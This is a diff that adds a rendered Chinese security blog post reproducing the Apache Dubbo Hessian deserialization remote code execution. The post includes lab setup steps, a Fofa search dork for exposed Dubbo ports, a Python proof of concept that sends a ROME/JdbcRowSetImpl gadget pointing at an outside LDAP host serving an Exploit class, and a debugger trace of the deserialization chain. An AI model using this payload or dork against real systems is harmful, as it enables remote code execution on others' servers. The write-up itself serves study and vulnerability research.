@@ -1,37 +1,880 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
 
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
 
-{% block page_class %}page-post-detail{% endblock %}
+  
 
 
-{% block content %}
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="文件下载首先git上下载包。 clonelink123git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;dubbo-spring-boot-projectcd dubbo-spring-boot-projectgit checkout 2.7.1 -b b2.7.1  将整个项目导入IDEA  PS:在dubbo-spring-boot-samples&#x2F;auto-config">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Apache Dubbo个人复现">
+<meta property="og:url" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="laker&#39;s Blog">
+<meta property="og:description" content="文件下载首先git上下载包。 clonelink123git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;dubbo-spring-boot-projectcd dubbo-spring-boot-projectgit checkout 2.7.1 -b b2.7.1  将整个项目导入IDEA  PS:在dubbo-spring-boot-samples&#x2F;auto-config">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707102043057.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105424065.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105657506.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105800961.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707110005736.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707110028802.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707121941311.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707122050177.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707122107804.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707123233691.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707123754474.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707135935340.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707140236728.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707140514456.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141133715.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141617388.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141727446.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707142129558.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707142701527.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143216372.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143358068.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143549826.png">
+<meta property="og:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143725584.png">
+<meta property="article:published_time" content="2020-07-07T01:55:50.000Z">
+<meta property="article:modified_time" content="2020-07-07T06:54:44.000Z">
+<meta property="article:author" content="laker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707102043057.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://laker.xyz/2020/07/07/Apache-Dubbo个人复现/"/>
+
+
+
+
+
+  <title>Apache Dubbo个人复现 | laker's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">laker's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">记录渗透测试琐事仅仅</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
 
   <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="laker's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Apache Dubbo个人复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2020-07-07T09:55:50+08:00">
+                2020-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p>首先git上下载包。</p>
+<figure class="highlight plaintext"><figcaption><span>clone</span><a target="_blank" rel="noopener" href="https://github.com/apache/dubbo-spring-boot-project">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/apache/dubbo-spring-boot-project</span><br><span class="line">cd dubbo-spring-boot-project</span><br><span class="line">git checkout 2.7.1 -b b2.7.1</span><br></pre></td></tr></table></figure>
+
+<p>将整个项目导入IDEA</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707102043057.png" alt="image-20200707102043057"></p>
+<p>PS:在dubbo-spring-boot-samples/auto-configure-samples/provider-sample/pom.xml需要有如下依赖</p>
+  <dependency>
+            <groupId>com.rometools</groupId>
+            <artifactId>rome</artifactId>
+            <version>1.7.0</version>
+        </dependency>
+
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105424065.png" alt="image-20200707105424065"></p>
+<p>这里有几个坑，也值得学习：</p>
+<ol>
+<li><p>直接打开项目没有Project文件只显示个pom</p>
+<p>solved:配置项目,File—Project Structure–Modules–增加项目目录</p>
+</li>
+<li><p>Spring-Boot无法识别到主类</p>
+<p>solved:全部导入后识别到5个主类入口</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105657506.png" alt="image-20200707105657506"></p>
+<p>只能选择DubboExternalizedConfigurationProviderBootstrap，否则会报错。</p>
+</li>
+</ol>
+<h1 id="启动环境"><a href="#启动环境" class="headerlink" title="启动环境"></a>启动环境</h1><p>搭建完成直接启动环境即可</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707105800961.png" alt="image-20200707105800961"></p>
+<h1 id="攻击Dubbo服务"><a href="#攻击Dubbo服务" class="headerlink" title="攻击Dubbo服务"></a>攻击Dubbo服务</h1><p>dubbo默认运行在12345端口，这里可通过dubbo-spring-boot-samples\externalized-configuration-samples\provider-sample\src\main\resources\application.properties进行修改，这里我修改为了12317端口。</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707110005736.png" alt="image-20200707110005736"></p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707110028802.png" alt="image-20200707110028802"></p>
+<p>由于dubbo开放的端口不包含WEB服务，因此对于Fofa的dork为：<strong>port:12345 &amp;&amp; protocol != “http” &amp;&amp; protocol != “https”</strong></p>
+<h1 id="代码执行问题"><a href="#代码执行问题" class="headerlink" title="代码执行问题"></a>代码执行问题</h1><p>com.sun.rowset.JdbcRowSetImpl在<strong>JDK 6u132, 7u122, or 8u113</strong>及之后的版本被修复了，可以换低版本jdk尝试。</p>
+<p>因此如果想看到弹窗需要使用&lt;8u113(dubbo不兼容7版本)</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707121941311.png" alt="image-20200707121941311"></p>
+<p>使用8u202现象，可用发起ldap请求，但是Send LDAP reference result返回后不会请求Exploit.class文件:</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707122050177.png" alt="image-20200707122050177"></p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707122107804.png" alt="image-20200707122107804"></p>
+<p>遂使用8u66:</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707123233691.png" alt="image-20200707123233691"></p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707123754474.png" alt="image-20200707123754474"></p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> dubbo.codec.hessian2 <span class="keyword">import</span> Decoder,new_object</span><br><span class="line"><span class="keyword">from</span> dubbo.client <span class="keyword">import</span> DubboClient</span><br><span class="line"></span><br><span class="line">client = DubboClient(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">JdbcRowSetImpl=new_object(</span><br><span class="line">      <span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span>,</span><br><span class="line">      dataSource=<span class="string">&quot;ldap://120.79.91.29:9999/Exploit&quot;</span>,</span><br><span class="line">      strMatchColumns=[<span class="string">&quot;foo&quot;</span>]</span><br><span class="line">      )</span><br><span class="line">JdbcRowSetImplClass=new_object(</span><br><span class="line">      <span class="string">&#x27;java.lang.Class&#x27;</span>,</span><br><span class="line">      name=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">      )</span><br><span class="line">toStringBean=new_object(</span><br><span class="line">      <span class="string">&#x27;com.rometools.rome.feed.impl.ToStringBean&#x27;</span>,</span><br><span class="line">      beanClass=JdbcRowSetImplClass,</span><br><span class="line">      obj=JdbcRowSetImpl</span><br><span class="line">      )</span><br><span class="line"></span><br><span class="line">resp = client.send_request_and_return_response(</span><br><span class="line">    service_name=<span class="string">&#x27;org.apache.dubbo.spring.boot.demo.consumer.DemoService&#x27;</span>,</span><br><span class="line">    method_name=<span class="string">&#x27;rce&#x27;</span>,</span><br><span class="line">    args=[toStringBean])</span><br></pre></td></tr></table></figure>
+
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>在如下报错代码断点org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol#getInvoker</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707135935340.png" alt="image-20200707135935340"></p>
+<p>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)  48行</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707140236728.png" alt="image-20200707140236728"></p>
+<p>继续跟入F7进入org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)函数</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707140514456.png" alt="image-20200707140514456"></p>
+<p>在89行存在readObject函数，但是注意这里是CodecSupport.getSerialization对象取得的，而不是ObjectInputStream的readObject，用了多态让父类型ObjectInput来接的，跟进89行的in.readObject，进入到了</p>
+<p>org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput#readObject(java.lang.Class<T>)</T></p>
+<p>可知CodecSupport.getSerialization返回的对象是Hessian2ObjectInput，再继而调了com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class)</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141133715.png" alt="image-20200707141133715"></p>
+<p>当前反序列化链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">org.apache.dubbo.common.serialize.Serialization</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</span><br><span class="line">com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class&lt;?&gt;...)</span><br></pre></td></tr></table></figure>
+
+<p>在com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class)继续调用自身三参数的readObject,在1877打个断点，后面涉及switch</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141617388.png" alt="image-20200707141617388"></p>
+<p>进入1880的return this.readObject(expectedClass)，在该文件重复调用几次readObject后返回</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707141727446.png" alt="image-20200707141727446"></p>
+<p>进入com.alibaba.com.caucho.hessian.io.JavaDeserializer.ObjectFieldDeserializer</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707142129558.png" alt="image-20200707142129558"></p>
+<p>当前反序列化链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">org.apache.dubbo.common.serialize.Serialization</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</span><br><span class="line">com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class&lt;?&gt;...)</span><br><span class="line">com.alibaba.com.caucho.hessian.io.JavaDeserializer.ObjectFieldDeserializer  613行</span><br></pre></td></tr></table></figure>
+
+<p>in是com.alibaba.com.caucho.hessian.io.JavaDeserializer的实例，进入后调用JavaDeserializer.FieldDeserializer的deserialize方法<img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707142701527.png" alt="image-20200707142701527"></p>
+<p>然后循环进入switch、最后在case127出去，进入2004行com.alibaba.com.caucho.hessian.io.Hessian2Input#findSerializerFactory</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143216372.png" alt="image-20200707143216372"></p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143358068.png" alt="image-20200707143358068"></p>
+<p>返回com/alibaba/com/caucho/hessian/io/Hessian2Input.class:2005</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143549826.png" alt="image-20200707143549826"></p>
+<p>返回后来到com.alibaba.com.caucho.hessian.io.JavaDeserializer#readObject(com.alibaba.com.caucho.hessian.io.AbstractHessianInput, java.lang.Object, java.lang.String[])</p>
+<p><img src="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/image-20200707143725584.png" alt="image-20200707143725584"></p>
+<p>得到反序列化链</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)</span><br><span class="line">org.apache.dubbo.common.serialize.Serialization</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2Serialization#deserialize</span><br><span class="line">org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput</span><br><span class="line">com.alibaba.com.caucho.hessian.io.Hessian2Input#readObject(java.lang.Class, java.lang.Class&lt;?&gt;...)</span><br><span class="line">com.alibaba.com.caucho.hessian.io.JavaDeserializer.ObjectFieldDeserializer  613行</span><br><span class="line">com.alibaba.com.caucho.hessian.io.Hessian2Input#findSerializerFactory</span><br><span class="line">com.alibaba.com.caucho.hessian.io.JavaDeserializer#readObject</span><br><span class="line">com.alibaba.com.caucho.hessian.io.JavaDeserializer.ObjectFieldDeserializer  614</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    <div>
+    
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/sweetalert/1.1.2/sweetalert.min.css">
+
+  <p><span>本文标题:</span>Apache Dubbo个人复现</a></p>
+  <p><span>文章作者:</span></a></p>
+  <p><span>发布时间:</span>2020年07月07日 - 09:55:50</p>
+  <p><span>最后更新:</span>2020年07月07日 - 14:54:44</p>
+  <p><span>原始链接:</span><a href="/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/" title="Apache Dubbo个人复现">http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://laker.xyz/2020/07/07/Apache-Dubbo%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%8E%B0/"  aria-label="复制成功！"></i></span>
+  </p>
+  <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>
+</div>
+<script>
+    var clipboard = new Clipboard('.fa-clipboard');
+    clipboard.on('success', $(function(){
+      $(".fa-clipboard").click(function(){
+        swal({
+          title: "",
+          text: '复制成功',
+          html: false,
+          timer: 500,
+          showConfirmButton: false
+        });
+      });
+    }));
+</script>
+
+    
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/03/%E5%86%85%E7%BD%91%E5%91%BD%E4%BB%A4%E8%AE%B0%E5%BD%95/" rel="next" title="内网命令记录">
+                <i class="fa fa-chevron-left"></i> 内网命令记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/07/07/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8FRE/" rel="prev" title="微信小程序RE">
+                微信小程序RE <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
 
     <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
+      
     </div>
   </div>
 
-{% endblock %}
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+          </div>
+          
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">44</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
